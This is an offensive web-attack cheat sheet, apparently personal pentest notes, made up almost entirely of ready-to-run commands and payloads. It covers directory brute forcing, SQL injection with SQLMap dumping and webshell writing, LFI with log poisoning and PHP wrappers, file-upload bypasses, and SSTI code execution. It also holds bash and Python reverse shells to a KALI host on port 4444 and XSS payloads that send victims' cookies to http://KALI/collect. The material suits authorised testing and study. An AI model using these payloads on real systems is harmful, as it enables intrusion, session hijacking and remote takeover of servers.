---
title: "Web Attacks"
---

# Web Attacks

Web applications are the most common initial access vector in modern engagements. This covers the attack techniques I use most consistently: from directory traversal to full RCE via file upload and injection flaws.

## Directory and File Enumeration

The starting point for any web target. Wordlist quality matters more than tool choice.

```bash
# Gobuster: directory brute force
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak,old,zip,tar -t 40

# With authentication
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -U admin -P password -t 40

# HTTPS
gobuster dir -u https://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 40

# Feroxbuster: recursive enumeration
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt --depth 3 -t 40

# Custom extensions based on identified tech stack
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x aspx,asp,ashx,asmx -t 40 # IIS
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x jsp,jspx -t 40            # Tomcat
```

## SQL Injection

### Manual Testing

Every input field and URL parameter gets tested:

```
# Error-based detection
' 
''
`
')
"))
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
admin'/*
```

### SQLMap

```bash
# Basic test
sqlmap -u "http://<IP>/page.php?id=1"

# POST request
sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=test" -p user,pass

# With session cookie
sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=abc123"

# From Burp request file
sqlmap -r request.txt

# Enumerate databases
sqlmap -u "http://<IP>/page.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://<IP>/page.php?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://<IP>/page.php?id=1" -D dbname -T users --dump

# OS shell (if privileged)
sqlmap -u "http://<IP>/page.php?id=1" --os-shell

# File read
sqlmap -u "http://<IP>/page.php?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://<IP>/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Manual SQL Injection: UNION Attack

When error-based confirmation is found:

```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- error means 2 columns

-- Find printable columns
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- Extract data
' UNION SELECT username,password FROM users--

-- Database version
' UNION SELECT @@version,NULL--      -- MySQL/MSSQL
' UNION SELECT version(),NULL--      -- PostgreSQL

-- Current user
' UNION SELECT user(),NULL--         -- MySQL
' UNION SELECT current_user,NULL--  -- PostgreSQL

-- List databases (MySQL)
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

## Local File Inclusion (LFI)

### Basic LFI

```
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=../../../../etc/passwd%00    # Null byte (old PHP)
http://<IP>/page.php?file=....//....//....//etc/passwd # Double dot trick
```

### Log Poisoning

Inject PHP code into a log file, then include it:

```bash
# Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/

# Then include the log
http://<IP>/page.php?file=../../../../var/log/apache2/access.log&cmd=id

# SSH auth log
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
http://<IP>/page.php?file=../../../../var/log/auth.log&cmd=id
```

### PHP Wrappers

```
# Read PHP source code
http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Decode
echo "<base64>" | base64 -d

# Execute data wrapper (needs allow_url_include=On)
http://<IP>/page.php?file=data://text/plain,<?php system($_GET['cmd']);?>
http://<IP>/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

## Remote File Inclusion (RFI)

```bash
# Host malicious PHP
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
python3 -m http.server 80

# Include from target
http://<IP>/page.php?file=http://KALI/shell.php&cmd=id
```

## File Upload Vulnerabilities

### Extension Bypass

```
# Try alternative extensions
.php → .php3, .php4, .php5, .phtml, .phps, .phar, .php7
.asp → .asp, .aspx, .asa, .ashx, .asmx, .cer, .aspq

# Double extension
shell.php.jpg
shell.jpg.php

# Uppercase
shell.PHP
shell.PhP

# Null byte (old systems)
shell.php%00.jpg
shell.php\x00.jpg
```

### MIME Type Bypass

Change Content-Type in the request:

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes

Add GIF/JPEG header to PHP code:

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Upload to Webshell

After successful upload, find the file path and access it:

```bash
# Common upload directories
/uploads/
/files/
/images/
/media/
/assets/
/wp-content/uploads/   # WordPress

# Check response for file path, or enumerate
gobuster dir -u http://<IP>/uploads/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

## Command Injection

### Detection

```
# Basic injection characters
;id
|id
||id
&&id
`id`
$(id)

# URL encoded
;id%0a
%7Cid
%26%26id
```

### Exploitation

```bash
# Reverse shell via command injection
;bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
|python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## Cross-Site Scripting (XSS)

### Stored XSS for Session Hijacking

```html
<!-- Basic alert to confirm XSS -->
<script>alert(1)</script>

<!-- Cookie theft payload -->
<script>document.location='http://KALI/collect?c='+document.cookie</script>
<script>new Image().src='http://KALI/collect?c='+document.cookie</script>

<!-- Receive with listener -->
python3 -m http.server 80
nc -lvnp 80
```

### XSS Bypasses

```html
<!-- Filter bypasses -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'><script>alert(1)</script>
```

## Server-Side Template Injection (SSTI)

### Detection

```
{{7*7}}         → 49 (Jinja2, Twig)
${7*7}          → 49 (FreeMarker)
<%= 7*7 %>      → 49 (ERB)
#{7*7}          → 49 (Ruby)
```

### Jinja2 (Flask/Python): RCE

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}
```

### Twig (PHP): RCE

```
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## Intercepting Traffic with Burp Suite

Essential workflow for web attacks:

1. Configure browser to proxy through Burp (127.0.0.1:8080)
2. Set Intercept to On
3. For every form/parameter, send to Repeater (Ctrl+R)
4. Test injections manually in Repeater
5. Send to Intruder for brute force / fuzzing
6. Use Comparer for response diffing

```bash
# Burp Suite headless (scan mode)
java -jar burpsuite_pro.jar --project-file=project.burp
```

## Common Web Vulnerabilities by Tech Stack

### PHP Applications

- File upload: check extension validation
- LFI/RFI: parameter values that look like file paths
- PHP deserialization: check for serialized objects in cookies/params

### ASP.NET Applications

- ViewState deserialization (if not MAC validated)
- SSRF via SSRF-vulnerable endpoints
- Path traversal with Windows separators (`..\..\`)

### Node.js Applications

- Prototype pollution
- SSTI with Handlebars, Pug, EJS
- Deserialization via node-serialize

### Java Applications (Tomcat, JBoss, WebLogic)

- Deserialization: Java serialized objects (`ac ed 00 05` magic bytes)
- JSP upload via manager console
- Expression Language injection
